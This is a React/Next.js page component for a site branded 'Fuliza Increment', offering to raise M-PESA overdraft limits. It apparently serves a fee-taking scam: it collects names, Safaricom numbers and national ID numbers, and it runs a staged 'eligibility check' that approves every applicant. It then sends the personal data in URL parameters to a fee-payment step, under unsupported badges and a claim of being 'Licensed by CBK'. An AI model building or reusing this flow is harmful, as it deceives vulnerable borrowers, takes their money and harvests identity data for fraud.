'use client'

import { useState } from 'react'
import Image from 'next/image'
import Link from 'next/link'
import { Shield, Lock, CheckCircle, ArrowLeft } from 'lucide-react'
import ProcessingPage from './ProcessingPage'
import IncrementSelectionPage from './IncrementSelectionPage'
import IncrementConfirmationPage from './IncrementConfirmationPage'
import { useAppDispatch, useAppSelector } from '@/store/hooks'
import { resetIncrementForm, setApplicantName, setIncrementType, setNationalId, setPhoneNumber, setSelectedIncrementAmount } from '@/store/incrementSlice'
import { initiateMpesaPayment } from '@/store/paymentSlice'
import { useRouter } from 'next/navigation'
import { getFeeAndRate } from '@/utils/increment'

export default function ApplyPage() {
  const router = useRouter()
  const dispatch = useAppDispatch()
  const {
    phoneNumber,
    incrementType,
    applicantName,
    nationalId,
    selectedIncrementAmount,
  } = useAppSelector((state) => state.increment)

  const [isSubmitting, setIsSubmitting] = useState(false)
  const [isApproved, setIsApproved] = useState(false)
  const [showConfirmation, setShowConfirmation] = useState(false)
  const [isProcessingPayment, setIsProcessingPayment] = useState(false)
  const [isCheckingEligibility, setIsCheckingEligibility] = useState(false)
  const [processingComplete, setProcessingComplete] = useState(false)

  const handleChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement>) => {
    const { name, value } = e.target

    switch (name) {
      case 'fullName':
        dispatch(setApplicantName(value))
        break
      case 'phoneNumber':
        dispatch(setPhoneNumber(value))
        break
      case 'nationalId':
        dispatch(setNationalId(value))
        break
      case 'incrementType':
        dispatch(setIncrementType(value))
        break
      default:
        break
    }
  }

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault()
    setIsSubmitting(true)
    setIsCheckingEligibility(true)
    setProcessingComplete(false)
  }

  // This callback will be called when processing is complete
  const handleProcessingComplete = () => {
    setProcessingComplete(true)
    setIsCheckingEligibility(false)
    setIsSubmitting(false)
    setIsApproved(true)
  }

  const handleSelectIncrement = (amount: number) => {
    dispatch(setSelectedIncrementAmount(amount))
    setShowConfirmation(true)
    setIsApproved(false)
  }

  const handleBackToForm = () => {
    dispatch(resetIncrementForm())
    setIsApproved(false)
    setShowConfirmation(false)
    setIsSubmitting(false)
    setProcessingComplete(false)
  }

  const handleBackToOffers = () => {
    setShowConfirmation(false)
    setIsApproved(true)
  }

  const handleApplyIncrement = async () => {
    if (!selectedIncrementAmount) {
      alert('Please select an increment amount before proceeding.')
      return
    }

    const { fee, rate, termDays } = getFeeAndRate(selectedIncrementAmount)

    try {
      // Navigate to /pay-warning with all details
      const params = new URLSearchParams({
        amount: selectedIncrementAmount.toString(),
        rate: rate.toString(),
        termDays: termDays.toString(),
        fee: fee.toString(),
        name: applicantName,
        phone: phoneNumber,
        incrementType: incrementType,
        nationalId: nationalId,
      })

      setShowConfirmation(false)
      setIsApproved(false)
      router.push(`/pay-warning?${params.toString()}`)
    } catch (err) {
      console.error(err)
      alert('An error occurred while preparing your request.')
    }
  }

  const firstName = applicantName.split(' ')[0] || ''

  if (isProcessingPayment) {
    return <ProcessingPage mode="payment" amount={selectedIncrementAmount ?? 0} phoneNumber={phoneNumber} />
  }

  // Show eligibility processing page - it will auto-advance through all steps
  if (isCheckingEligibility) {
    return (
      <ProcessingPage 
        mode="eligibility" 
        onComplete={handleProcessingComplete}
      />
    )
  }

  // Show increment confirmation
  if (showConfirmation && selectedIncrementAmount) {
    return (
      <IncrementConfirmationPage
        userName={firstName}
        incrementAmount={selectedIncrementAmount}
        phoneNumber={phoneNumber}
        onBack={handleBackToOffers}
        onApply={handleApplyIncrement}
      />
    )
  }

  // Show increment selection screen
  if (isApproved) {
    return (
      <IncrementSelectionPage
        userName={firstName}
        phoneNumber={phoneNumber}
        onBack={handleBackToForm}
        onSelectIncrement={handleSelectIncrement}
      />
    )
  }

  // Show application form
  return (
    <main className="min-h-screen bg-gray-50">
      {/* Header */}
      <header className="border-b border-gray-200 bg-white">
        <div className="container-custom py-4 flex justify-between items-center">
          <div className="flex items-center gap-4">
            <Link href="/" className="text-gray-600 hover:text-gray-900">
              <ArrowLeft className="w-5 h-5" />
            </Link>
            <div className="flex items-center gap-2">
              <div className="relative w-10 h-10">
                <Image 
                  src="/image.png" 
                  alt="Fuliza Increment logo" 
                  fill
                  className="object-contain"
                />
              </div>
              <span className="text-sm font-medium text-gray-700">Fuliza Increment</span>
            </div>
          </div>
          <button className="text-gray-600 hover:text-gray-900 text-sm font-medium">
            Help
          </button>
        </div>
      </header>

      {/* Application Form */}
      <div className="container-custom py-8 md:py-12">
        <div className="max-w-2xl mx-auto bg-white rounded-2xl shadow-lg p-6 md:p-8">
          <div className="text-center mb-8">
            <h1 className="text-2xl md:text-3xl font-bold text-[#0f766e] mb-2">
              M-PESA INFORMATION
            </h1>
            <p className="text-gray-600 text-sm">
              Fill in your details to check eligibility
            </p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Full Name */}
            <div>
              <label htmlFor="fullName" className="block text-sm font-medium text-gray-700 mb-1">
                Full Name
              </label>
              <input
                type="text"
                id="fullName"
                name="fullName"
                value={applicantName}
                onChange={handleChange}
                placeholder="Enter your full name as on your national ID"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0f766e] focus:border-transparent outline-none transition"
                required
              />
            </div>

            {/* Phone Number */}
            <div>
              <label htmlFor="phoneNumber" className="block text-sm font-medium text-gray-700 mb-1">
                Phone Number
              </label>
              <input
                type="tel"
                id="phoneNumber"
                name="phoneNumber"
                value={phoneNumber}
                onChange={handleChange}
                placeholder="Safaricom only—e.g. 0712 345 678 or 0110 123 456"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0f766e] focus:border-transparent outline-none transition"
                required
              />
              <p className="text-xs text-gray-500 mt-1">Safaricom line required for M-PESA verification</p>
            </div>

            {/* National ID Number */}
            <div>
              <label htmlFor="nationalId" className="block text-sm font-medium text-gray-700 mb-1">
                National ID Number
              </label>
              <input
                type="text"
                id="nationalId"
                name="nationalId"
                value={nationalId}
                onChange={handleChange}
                placeholder="7 to 9 digit Kenyan National ID number"
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0f766e] focus:border-transparent outline-none transition"
                required
                pattern="\d{7,9}"
                title="Please enter a valid 7-9 digit ID number"
              />
            </div>

            {/* Increment Type */}
            <div>
              <label htmlFor="incrementType" className="block text-sm font-medium text-gray-700 mb-1">
                Select Increment Type
              </label>
              <select
                id="incrementType"
                name="incrementType"
                value={incrementType}
                onChange={handleChange}
                className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0f766e] focus:border-transparent outline-none transition bg-white"
                required
              >
                <option value="">Choose the purpose of your increment</option>
                <option value="personal">Personal Increment</option>
                <option value="business">Business Increment</option>
                <option value="education">Education Increment</option>
                <option value="emergency">Emergency Increment</option>
                <option value="home_improvement">Home Improvement</option>
              </select>
            </div>

            {/* Trust Badges */}
            <div className="flex flex-wrap justify-center gap-6 pt-4 border-t border-gray-200">
              <div className="flex items-center gap-2">
                <Shield className="w-5 h-5 text-green-600" />
                <span className="text-sm font-medium text-gray-700">Secure</span>
              </div>
              <div className="flex items-center gap-2">
                <Lock className="w-5 h-5 text-green-600" />
                <span className="text-sm font-medium text-gray-700">Licensed</span>
              </div>
              <div className="flex items-center gap-2">
                <CheckCircle className="w-5 h-5 text-green-600" />
                <span className="text-sm font-medium text-gray-700">No CRB Check</span>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full bg-[#e31e24] hover:bg-[#c41a1f] text-white font-semibold py-4 px-8 rounded-lg transition-colors duration-200 disabled:opacity-50 disabled:cursor-not-allowed"
            >
              {isSubmitting ? 'Processing...' : 'Check Eligibility'}
            </button>

            <p className="text-center text-sm text-gray-500 mt-2">
              No paperwork required. No guarantors needed.
            </p>
          </form>
        </div>
      </div>

      {/* Footer */}
      <footer className="bg-[#0f766e] text-white py-6 mt-8">
        <div className="container-custom">
          <div className="flex flex-col md:flex-row justify-between items-center gap-4">
            <div className="flex gap-6">
              <a href="#" className="hover:text-gray-300 transition-colors text-sm">
                Privacy
              </a>
              <a href="#" className="hover:text-gray-300 transition-colors text-sm">
                Terms
              </a>
              <a href="#" className="hover:text-gray-300 transition-colors text-sm">
                Contact
              </a>
            </div>
            <p className="text-sm text-blue-300">
              &copy; 2026 Fuliza Increment Kenya. Licensed by CBK.
            </p>
          </div>
        </div>
      </footer>
    </main>
  )
}